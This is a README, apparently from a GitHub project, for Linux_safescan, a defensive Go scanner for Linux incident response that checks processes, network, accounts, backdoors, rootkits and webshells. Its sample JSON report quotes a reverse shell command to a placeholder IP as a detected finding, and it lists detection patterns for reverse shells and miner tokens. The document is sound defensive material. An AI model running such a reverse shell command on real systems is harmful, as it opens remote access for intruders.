# <div align="center">Linux_safescan</div>

<div align="center">

**面向 Linux 主机应急响应与安全巡检的一体化扫描器：快速、可扩展、报告清晰。**

[![Go Version](https://img.shields.io/badge/Go-1.25+-00ADD8?style=for-the-badge&logo=go)](https://go.dev/)
[![Platform](https://img.shields.io/badge/Platform-Linux-2F855A?style=for-the-badge&logo=linux)](#quick-start)
[![License](https://img.shields.io/badge/License-Open%20Source-111827?style=for-the-badge)](#license)
[![Repo](https://img.shields.io/badge/GitHub-Mingcharun%2FLinux__safescan-181717?style=for-the-badge&logo=github)](https://github.com/Mingcharun/Linux_safescan)

</div>

> Linux_safescan 是一款以 Go 实现的主机安全巡检与应急响应工具：聚焦高质量证据采集、结构化报告与可操作建议，面向被黑应急和常规安全检测两大场景。

## 为什么选择 Linux_safescan

- 专业覆盖：进程、网络、账户、配置、历史、启动项、文件、后门、Rootkit、Web 内容，全域巡检
- 强悍内核：内置 IOC/Rootkit/Web 内容规则与离线 GeoIP，开箱即用
- 高效自洽：纯 Go 单机自检，无需服务端；Diff 模式聚焦新增风险
- 报告清晰：英文风格文本报告 + JSON 结构化产物，利于审计与工单流转
- 可控合规：模块可选、路径可配、阈值可调；不联网、不外传，现场可控

## 核心能力总览

Linux_safescan 提供覆盖主机侧常见风险面的全量扫描能力：

- IOC 文本规则匹配（恶意特征）
- 模块化扫描：进程、网络、账户、配置、登录日志、后门、Rootkit、Web 内容
- 系统关键二进制哈希基线与差异比较
- 离线 GeoIP 查询，识别外联/登陆来源是否为境外
- 英文风格文本报告 + JSON 结构化报告
- `crontab` 定时执行与常见安全日志打包

## 能力矩阵

| Capability | Status | Notes |
| --- | --- | --- |
| IOC rules | Ready | 内置 `assets/malware` 文本指纹 |
| GeoIP | Ready | 内置 `assets/geoip/17monipdb.dat` |
| Rootkit scan | Ready | 默认加载 `assets/rootkits.json` |
| Web content scan | Ready | 内置 `assets/webshell_rule/*.yar` 轻量匹配 |
| Diff mode | Ready | 对比上次结果，仅输出新增异常（NewFindings） |
| Host report | Ready | 英文文本报告与 JSON 输出 |
| Scheduled run | Ready | 生成/写入定时执行项 |

## 快速开始

### 1）直接运行

```bash
go run ./cmd/linux_safescan
```

### 2）常用模式

```bash
go run ./cmd/linux_safescan --full
go run ./cmd/linux_safescan --dif
go run ./cmd/linux_safescan --triage
go run ./cmd/linux_safescan --sug --pro
go run ./cmd/linux_safescan --job --hour=2
go run ./cmd/linux_safescan --log
go run ./cmd/linux_safescan --time="2026-03-20 00:00:00~2026-03-20 23:59:59"
```

### 3）构建二进制

```bash
go build -o linux_safescan ./cmd/linux_safescan
./linux_safescan --version
```

## 场景对照清单（全面映射）

1 主机信息获取：Hostname / IP / OS / Time  
2 系统初始化 alias 检查：/etc/profile、/etc/bashrc、用户 .bashrc/.bash_profile  
3 文件类安全扫描  
  3.1 系统重要文件完整性：系统关键二进制 MD5 基线与差异  
  3.2 系统可执行文件安全扫描：白名单目录内关键二进制内容特征分析  
  3.3 临时目录文件扫描：/tmp、/var/tmp、/dev/shm  
  3.4 用户目录文件扫描：/home、/root  
  3.5 可疑隐藏文件扫描：find “..*” 并规避系统路径  
4 各用户历史操作类  
  4.1 境外 IP 操作类：history 外联命令 + GeoIP 判定  
  4.2 反弹 shell 类：history 匹配反弹/下载执行等特征  
5 进程类安全检测  
  5.1 CPU/内存使用异常：默认阈值 70%  
  5.2 隐藏进程扫描：对比 ps 与 /proc  
  5.3 反弹 shell 类进程扫描：命令行特征  
  5.4 恶意进程信息扫描：命令行包含可疑 token（minerd/sqlmap 等）  
  5.5 进程对应可执行文件安全扫描：/proc/PID/exe 指向文件内容特征  
6 网络类安全检测  
  6.1 境外 IP 链接扫描：ss 输出 + GeoIP 判定  
  6.3 恶意特征链接扫描：远端端口匹配恶意端口表（如 31337/6667 等）  
  6.4 网卡混杂模式检测：ip -o link show 含 PROMISC  
7 后门类检测  
  7.1–7.4 环境变量后门：LD_PRELOAD / LD_AOUT_PRELOAD / LD_ELF_PRELOAD / LD_LIBRARY_PATH  
  7.5 ld.so.preload  
  7.6 PROMPT_COMMAND  
  7.7 Cron 后门（/var/spool/cron、/etc/cron.*）  
  7.8 Alias 后门（见 2）  
  7.9 SSH 后门（非 22 端口）  
  7.10 SSH wrapper 后门（/usr/sbin/sshd 非 ELF）  
  7.11 inetd.conf、7.12 xinetd.conf  
  7.13 setUID 后门（白名单过滤）  
  7.14 系统启动项后门（init.d、rc.*、rc.local、systemd 等 8 类）  
8 账户类安全排查  
  8.1 root 权限账户（uid=0 非 root）  
  8.2 空口令账户  
  8.3 sudoers 权限异常  
  8.4 各账户登录公钥  
  8.5 账户密码文件权限异常  
9 日志类安全分析  
  9.1 secure/auth.log 成功登录（外部来源）  
  9.2 wtmp、9.3 utmp、9.4 lastlog 外部来源判定  
10 安全配置类分析  
  10.1 DNS 配置（境外 DNS）  
  10.2 Iptables 配置（宽松 ACCEPT）  
  10.3 hosts 配置（境外 IP 绑定）  
11 Rootkit 分析  
  11.1 已知 rootkit 文件特征  
  11.2 已知 rootkit LKM 模块名  
  11.3 恶意软件文本特征（--full 开启）  
12 WebShell 类文件扫描：自动推断 Web 根，匹配轻量规则

## 内置资产

仓库已经内置扫描所需核心资产，开箱可用：

- `assets/malware`
- `assets/geoip/17monipdb.dat`
- `assets/rootkits.json`
- `assets/webshell_rule`

运行时可覆盖：

```bash
go run ./cmd/linux_safescan \
  --rules-dir=/path/to/malware \
  --geoip-db=/path/to/17monipdb.dat \
  --rootkit-source=/path/to/rootkits.json \
  --webshell-rules=/path/to/webshell_rule
```

## 命令行参数（CLI Flags）

| Flag | Description |
| --- | --- |
| `--version` | 输出版本号 |
| `--full` | 开启完整 IOC 特征匹配 |
| `--dif` | 仅输出相对上次的新发现 |
| `--sug` | 在文本报告中附加调查参考 |
| `--pro` | 在文本报告中附加初始处置建议 |
| `--time` | 时间范围检索改动文件，格式 `start~end` |
| `--job --hour=N` | 写入或更新定时执行（每 N 小时执行一次） |
| `--log` | 打包常见安全日志并输出归档 |
| `--overseas` | 跳过境外 IP 判断（性能优化/离线场景） |
| `--rules-dir` | 恶意特征规则路径（默认 `assets/malware`） |
| `--geoip-db` | 17mon IP 数据库路径 |
| `--rootkit-source` | Rootkit 规则源（`*.json`） |
| `--webshell-rules` | Web 内容规则目录 |
| `--output` | 输出根目录（默认 `outbox/`） |
| `--finding-hash-db` | Diff 模式历史指纹文件 |
| `--hash-db` | 系统二进制基线哈希文件 |
| `--disable-log-scan` | 禁用登录日志分析 |
| `--disable-webshell` | 禁用 Web 内容扫描 |
| `--disable-rootkit` | 禁用 Rootkit 扫描 |
| `--triage` | 启用快速分诊（关闭 Rootkit/Webshell 深扫） |
| `--cpu-threshold` | CPU 异常阈值（默认 70） |
| `--mem-threshold` | 内存异常阈值（默认 70） |

## 输出结构说明

默认输出目录为 `outbox/`，关键文件如下：

```text
outbox/
├── db/
│   ├── report.json
│   ├── findings_hashes.txt
│   └── system_hashes.txt
└── log/
    └── linux_safescan.log
```

### 文本报告（log/linux_safescan.log）

- 标题：`Linux_safescan Security Audit`  
- 元信息：Version / Author / Repository / Target / Platform / Window / Mode  
- Findings：以 `[NNN] LEVEL | Category :: Name` 形式列示，字段含义：
  - Time / User / PID / File / Details / Reference / Remediation
- 附录：Open Services / Timeline / Warnings

### JSON 报告（db/report.json）

关键字段（节选）：

- `version`：版本号
- `host`：目标主机信息
- `findings`：全部发现
- `new_findings`：在 `--dif` 模式下的新增发现
- `open_services`、`timeline`、`warnings`：附加信息
- `diff_mode`、`suggestion`、`programme`：输出选项位

字段说明补充：

- `findings[].severity`：`info/suspicious/risk`，对应文本报告 `INFO/SUSPICIOUS/RISK`  
- `findings[].consult`：定位与复核的参考命令  
- `findings[].programme`：初始处置建议（需结合现场策略谨慎执行）  

示例片段：

```json
{
  "version": "v0.1.0-go",
  "host": {"hostname":"node-01","ip":"10.0.0.8","os":"CentOS 7","time":"2026-03-27T10:40:12Z"},
  "diff_mode": true,
  "new_findings": [
    {
      "category": "Process Anomalies",
      "name": "Reverse shell-like process",
      "pid": "2417",
      "user": "www-data",
      "info": "Suspicious process: bash -i >& /dev/tcp/1.2.3.4/4444 0>&1",
      "severity": "risk",
      "created_at": "2026-03-27T10:39:59Z"
    }
  ]
}
```

## 架构与模块

设计与目录：

- `internal/scanners/*`：各类扫描模块（进程/网络/账户/配置/历史/启动项/文件/后门/Rootkit/Web 内容）
- `internal/scanner`：通用运行时与工具库（IP 判定、文件遍历、字符串提取等）
- `internal/rules`：规则加载与轻量匹配引擎
- `internal/report`：文本/JSON 报告与指纹库（diff 模式）
- `internal/app`：应用编排（模块调度、输出落盘、定时任务/日志打包）
- `internal/config`：参数解析与默认路径

工程骨架：

```
.
├── assets/                  内置规则、GeoIP、Rootkit/Web 内容规则
├── cmd/linux_safescan/      CLI 入口
├── docs/                    设计与路线图
├── internal/                扫描器、规则加载、报告与基础设施
└── README.md
```

## 使用建议

- 首次运行不加 `--dif`，以生成系统二进制哈希基线（`system_hashes.txt`），后续常规巡检开启 `--dif` 聚焦新增风险  
- 尽可能以 root 权限运行，以获得完整可见性（/proc、系统日志与路径）  
- 分层排查：优先 `RISK`，再 `SUSPICIOUS`，最后 `INFO`  
- 模块裁剪：按场景禁用不需要模块（`--disable-log-scan`/`--disable-webshell`/`--disable-rootkit`）  
- 证据落地：所有证据落地 `outbox/`，便于打包留存或入库  

推荐：

```bash
go vet ./...
go test ./...
go test -race ./...
go run ./cmd/linux_safescan --version
```

> 说明：开发机为 macOS；完整主机扫描回归需在 Linux 环境执行。

## 性能与兼容性

- 设计为“尽可能快速”的主机侧自检，单机扫描开销主要取决于文件体量与 `find/strings` 操作  
- 对较大文件设置体积阈值，避免大文件全量读取；可按需放宽或收紧  
- 需要标准命令可用（`ps/ss/who/lastlog/find/ip` 等），容器最小化镜像需预装  

## 依赖与权限

- 建议 root 运行，确保可读系统日志与关键路径  
- 依赖常见系统命令：ps、ss、who、lastlog、find、ip、strings（可选）  
- 默认不访问外网；GeoIP 使用内置离线库  

## 故障排查（Troubleshooting）

- 报告为空或 Findings 很少：检查是否以 root 运行；检查 ps/ss/who/lastlog 是否可用  
- `ss` 不存在：后续版本将增加自动降级；当前可临时安装或替换为兼容命令  
- Web 扫描无结果：检查 `DiscoverWebRoots` 推断的路径是否覆盖你的部署；必要时自定义规则目录  

## 常见问题（FAQ）

- Q：报告语言为何是英文？  
  A：为便于跨团队沟通与工单流转，报告统一采用英文；命令行交互与文档为中文。
- Q：GeoIP 为何有中文地域名？  
  A：离线库数据保持原始命名以保证匹配准确；对外展示均为英文风格。
- Q：误报如何收敛？  
  A：结合 `--dif` 模式、基线维护与模块禁用选项；必要时调整规则目录或阈值。

## 与传统工具对比（参考）

- rkhunter / chkrootkit：更偏向 rootkit 检测；Linux_safescan 提供更全面的主机侧巡检（账户、日志、网络、历史、Web 等），报告结构更清晰  
- 通用 YARA 扫描器：偏向规则匹配；Linux_safescan 融合运行时态势（进程/网络/日志）与可操作建议  

## 路线图（Roadmap）

- 更细粒度的输出管控（字段可配、模板可配）
- 模块化扩展生态与更完备的规则库
- 更友好的 HTML/CSV 报告

详情见 [`docs/ROADMAP_CN.md`](docs/ROADMAP_CN.md)。

## 作者

- ID: `PINGXCpost`
- GitHub: [Mingcharun](https://github.com/Mingcharun)

## 协议

开源发布前建议补充明确的许可证文件。当前仓库尚未添加 `LICENSE`。
